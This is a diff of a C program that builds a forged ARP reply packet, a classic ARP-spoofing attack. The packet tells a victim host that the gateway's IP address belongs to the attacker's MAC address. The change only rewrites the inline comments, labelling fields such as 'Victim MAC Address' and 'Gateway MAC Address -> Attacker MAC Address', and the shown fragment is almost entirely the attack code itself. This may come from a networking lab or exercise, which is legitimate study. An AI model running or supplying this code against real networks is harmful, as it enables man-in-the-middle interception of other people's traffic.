@@ -150,19 +150,19 @@ int main(int argc, char **argv)
 
     //arp attack
 //    u_char gmac[6] = {0x52, 0x54, 0x00, 0x12, 0x35, 0x02}; //gateway mac 52:54:00:12:35:02
-    memcpy(ethhd.eth_dmac, smac, 6); //victim mac
-    memcpy(ethhd.eth_smac, ifr->ifr_hwaddr.sa_data, 6);  //my mac
-    ethhd.eth_type = htons(0x0806);
-    arphd.arp_hrd = htons(0x01);
-    arphd.arp_proto = htons(0x0800);
-    arphd.arp_hl = 6;
-    arphd.arp_pln = 4;
-    arphd.arp_op = htons(2);    //arp reply
-    memcpy(arphd.arp_smac, ifr->ifr_hwaddr.sa_data, 6); //gateway mac -> my mac
-    memcpy(arphd.arp_sip, ipd, 4);  //gateway ip
+    memcpy(ethhd.eth_dmac, smac, 6); //Victim MAC Address
+    memcpy(ethhd.eth_smac, ifr->ifr_hwaddr.sa_data, 6);  //Attacker MAC Address
+    ethhd.eth_type = htons(0x0806); //
+    arphd.arp_hrd = htons(0x01);    //Hardware Type (Ethernet : 1)
+    arphd.arp_proto = htons(0x0800);    //Protocol Type (IPv4 : 0x0800)
+    arphd.arp_hl = 6;   //Hardware Address Length
+    arphd.arp_pln = 4;  //Protocol Address Length
+    arphd.arp_op = htons(2);    //Operation (ARP reply : 2)
+    memcpy(arphd.arp_smac, ifr->ifr_hwaddr.sa_data, 6); //Gateway MAC Address -> Attacker MAC Address
+    memcpy(arphd.arp_sip, ipd, 4);  //Gateway IP Address
 
-    memcpy(arphd.arp_dmac, smac, 6);    //victim mac
-    memcpy(arphd.arp_dip, ips, 4);      //victim ip
+    memcpy(arphd.arp_dmac, smac, 6);    //Victim MAC Address
+    memcpy(arphd.arp_dip, ips, 4);      //Victim IP Address
 
     memset(packet, 0 ,sizeof(packet));
     memcpy(packet, &ethhd, sizeof(ethhd));
